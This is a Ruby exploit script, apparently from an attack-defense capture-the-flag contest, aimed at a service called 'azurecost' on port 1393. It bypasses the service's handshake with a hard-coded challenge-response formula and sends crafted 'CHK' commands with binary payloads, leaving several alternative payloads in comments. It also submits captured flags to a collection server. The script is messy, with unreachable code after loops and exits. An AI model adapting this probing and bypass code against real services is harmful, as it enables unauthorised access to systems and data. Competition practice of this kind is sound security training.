#!/usr/bin/env ruby
require 'socket'
require 'timeout'
require 'yaml'
require 'hexdump'

#########################################
#
#   сервис: azurecost
#    порты: 1393
# алгоритм:
#
#########################################

TARGET_PORT = 1393

OUR_HOST = '10.12.21.8'
FLAG_RE  = /^[a-f0-9]{16}$/i

# координаты нашей постилки флагов
POST_FLAGS_HOST = "10.12.21.21"
POST_FLAGS_PORT = 12321

#########################################

STDOUT.sync = true

@host  = 'localhost'
@ids   = {}
@flags = []

#raise "don't attack self!" if @host == OUR_HOST

class UnicodeSocket < TCPSocket
  def puts string
    write((string+"\n").split('').map{ |c| "#{c}\x00\x00\x00" }.join)
  end

  def gets
    r = super
    r ? r.tr("\x00","") : r
  end
end

def _submit_flags
  socket = TCPSocket.new POST_FLAGS_HOST, POST_FLAGS_PORT
  socket.puts "id=azure"
  socket.gets
  socket.puts @flags.join("\n")
  socket.flush
  socket.close
  @flags = []
end

def submit_flags
  Timeout.timeout(60){ _submit_flags }
rescue
  puts "[!] #{__method__}: #{$!}"
end

@hash = {}

def attack_host
  socket = UnicodeSocket.new @host, TARGET_PORT
  chal = socket.read(4).unpack('L')[0]
  printf " in: %08x %10d\n", chal&0xffffffff, chal

  resp = (chal^0xa7f7e284)**2 + 0xa82d3274

 # outdata = "\xba\xdc\xc0\xff"
  outdata = [resp].pack('L')
  data = outdata.unpack('L')[0]
  printf "out: %08x %10d\n", data&0xffffffff, data

  #52.upto(72) do |i|
  #28.upto(72) do |i|
  1.upto(72) do |i|
    fname = "%017i" % i
    puts "%x" % i
    socket.puts("CHK #{fname}\x20\x05\x04\x01\x0d\x08")
    while true do
      s = socket.gets.strip
      if s['HASH:']
        #puts s unless s['-639881384']
        puts s unless s['-537294294']
        break
      end
    end
  end

  #socket.puts "CHK 00000000000000000\x33\x20\x21\x22\x23\x24"
  #socket.puts "CHK foobar\x00zzz"
  #socket.puts("CHK fHEcUR86=iJubMyag\x20\x05\x04\x00\x0d\x07")
  #socket.puts("CHK fHEcUR86=iJubMyag\x20\x05\x04\x01\x0d\x07")
  socket.puts("CHK fHEcUR86=iJubMyag\x20\x03\x03\x03\x09\x07\x06\x0e")
  #socket.puts("CHK fIeBU5T6s1QA20FmH\x20\x05\x04\x01\x0d\x07")
  #socket.puts("CHK foobar\x6b\x20\x0b\x03\x03\x09\x07\x06\x0e")


#  socket.puts("LST")
#
#  while true do
#    s = socket.gets.strip
#    puts s
#    break if s == "END of list"
#  end

  #socket.puts("PWD &D2/&GZN'-7=EI0");
  #socket.puts("GET foobar");

  while true do
    s = socket.gets.strip
    puts s
  end

  s = socket.gets.tr("\x00",'')
  #p s
  data = s.to_i
  printf " in: %08x %10d\n", data&0xffffffff, data

  exit

  data = socket.read(4)
  p data
  socket.close
  x = data.unpack('I').first
  printf "%10d: %10d %8x\n", @hash.size, x, x
#rescue
#  p $!
#  sleep 1
end

while true do
  while true do
    attack_host
    exit
  end
  exit
  submit_flags if @flags.any?
  sleep 10
end
